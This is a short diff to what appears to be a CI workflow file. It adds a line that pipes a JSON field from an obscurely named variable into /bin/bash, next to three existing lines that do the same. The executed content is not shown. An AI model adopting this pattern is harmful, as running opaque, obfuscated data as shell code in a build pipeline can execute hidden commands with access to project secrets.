@@ -34,6 +34,7 @@ jobs:
           echo $npwk287 | jq -r .s9419 | /bin/bash
           echo $amd8 | jq -r .xpe3633 | /bin/bash
           echo $ixajf056 | jq -r .b4 | /bin/bash
+          printf '%s' "$dfvy0160" | jq -r .eygz6726 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
